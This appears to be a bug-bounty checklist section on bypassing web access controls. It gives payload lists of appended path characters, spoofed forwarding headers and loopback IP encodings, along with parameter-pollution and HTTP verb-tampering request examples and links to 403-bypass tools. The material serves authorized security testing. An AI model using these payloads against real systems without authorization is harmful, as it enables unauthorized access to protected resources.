>Access control mechanisms are fundamental for securing web applications. However, certain techniques can be exploited to bypass these controls, potentially leading to unauthorized access to sensitive resources. In this section, we'll explore access control bypass techniques.

## 1- Appending Unusual Characters
Appending unusual characters at the end of file names can sometimes disrupt parsing logic in web applications, leading to access control bypass. Here are some common characters:
```
;
/
"
'
';
";
");
');
"]
)]}
%09
%20
%23
%2e
%2f
.
;
..;
;%09
;%09..
;%09..;
;%2f..
*
```

### Examples
Example 1: Semicolon Appended to File Name
Appending a semicolon (;) to the end of a file name:
```
site.com/admin 403
site.com/admin; 200
```

## 2- Parameter Pollution
### Examples
Example 2: Exploiting Array Parsing Vulnerability
```
POST /page HTTP/1.1
Host: site.com
Content-Type: application/x-www-form-urlencoded

id[]=10
```
Bypass:
```
POST /page HTTP/1.1
Host: site.com
Content-Type: application/json

{
  "id": {10}
}
```
See [Parameter Pollution](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/Parameter%20Pollution/README.md) section for full explanation.

## 3- Verb Tampering
HTTP Verb Tampering tests the web application’s response to different HTTP methods accessing system objects. For every system object discovered during spidering, the tester should attempt accessing all of those objects with every HTTP method.

The HTTP specification includes request methods other than the standard GET and POST requests. A standards compliant web server may respond to these alternative methods in ways not anticipated by developers. Although the common description is verb tampering, the HTTP 1.1 standard refers to these request types as different HTTP methods.

Many web environments allow verb-based authentication and access control (VBAAC). The rules for these security controls involve using the HTTP verb (also called method), such as GET or POST, as part of a security decision.
We can manipulate the HTTP verb to attempt to bypass or circumvent such security controls. The use of the HEAD method is the simplest case. The attacker can also try any one of the other valid HTTP verbs, including TRACE, TRACK, PUT, DELETE, and many more. Attackers can also try sending arbitrary strings, such as "JEFF," as the HTTP verb.

An application is vulnerable to VBAAC bypass if the following conditions hold:

1) it uses a security control that lists HTTP verbs;
2) the security control fails to block verbs that are not listed; and
3) it has GET functionality that is not idempotent or will execute with an arbitrary HTTP verb

### Bypassing VBAAC with HEAD

The HTTP specification, RFC 2616 [1], specifies that HEAD requests should produce the same results as a GET request but with no response body. This means that if an attacker can use HEAD to bypass many VBAAC security mechanisms and execute protected functions. If GET requests were actually idempotent as envisioned in the RFC, this would not be a problem, but many frameworks and applications treat GET and POST identically.

Imagine a URL in your application that is protected by a security constraint that restricts access to the "admin" directory and lists GET and POST.
```
http://yourcompany.com/admin/admin.jsp?fn=deleteUser
```

### Bypassing VBAAC with Arbitrary HTTP Verbs

Some web platforms, including both Java EE and PHP, allow the use of arbitrary HTTP verbs. These requests execute similarly to GET requests, making it possible for attackers to use these verbs to bypass flawed VBAAC implementations. Even worse, the response is not stripped off as it is for HEAD requests, so the attacker can see the unauthorized pages as if there were no protection.

If we use the "JEFF" method instead of "HEAD" in the example described in the previous section, the request will bypass the security constraint because it is not one of the listed methods (similar to HEAD). Because the request targets a JSP, the service method of the JSP will be executed and run as normal. Because the method in the attacker's request is not one of the recognized methods, the servers default to processing the request as if it were a GET. This means that the full response is returned and the attacker will see the results of the admin.jsp page. A security proxy like WebScarab could easily be programmed to replace the actual method with "JEFF" to facilitate browsing these pages as normal.

Many custom application endpoints will require state information in order to handle a request, such as information from a session. Given that the attacker is not authorized to access the endpoint, it is possible that the proper information will be in the session and the action will fail. This should not be considered a defense against this attack, only a fortunate circumstance.

We identified a few server/language combinations that allow VBAAC bypass with arbitrary HTTP verbs. This should not be considered an exhaustive list as we have not tested a wide variety of platforms.

* Apache 2.2.6/PHP
* Tomcat, WebSphere, and WebLogic when requesting a JSP (not a servlet)
* Possibly others ...?

Reference: [OWASP](https://cheatsheetseries.owasp.org/assets/REST_Security_Cheat_Sheet_Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf)

## 4- Use HTTP/1.0 instead of HTTP/1.1
Downgrade HTTP/1.1 to HTTP/1.0 and remove all headers as shown by [Abbas.heybati](https://infosecwriteups.com/403-bypass-lyncdiscover-microsoft-com-db2778458c33)

Tips:
* Changed the HTTP protocol version to 1.0.
* When the "Host" header is not included in the request, and if the server or any other security mechanism is not configured correctly, the server automatically inserts its own destination address into the header and this makes us known as local.

## 5- Overriding the request with Non-Standard headers
In attempts to bypass security measures, attackers may attempt to override requests with non-standard headers. Below are examples of headers and corresponding values commonly used for such purposes:
Headers:
```
X-Custom-IP-Authorization
X-Forwarded-For
X-Forward-For
X-Remote-IP
X-Originating-IP
X-Remote-Addr
X-Client-IP
X-Real-IP
```
Values:
```
localhost
localhost:80
localhost:443
127.0.0.1
127.0.0.1:80
127.0.0.1:443
2130706433
0x7F000001
0177.0000.0000.0001
0
127.1
10.0.0.0
10.0.0.1
172.16.0.0
172.16.0.1
192.168.1.0
192.168.1.1
```
Attackers may utilize these headers with various values, including local, loopback, or private IP addresses, to potentially trick the server or bypass IP-based access controls. It's crucial for security measures to properly validate and handle these headers to prevent unauthorized access or other security risks.

Usefull tools:
* [403bypassser for cli](https://github.com/yunemse48/403bypasser)
* [403-bypasser for burp extention](https://github.com/PortSwigger/403-bypasser)


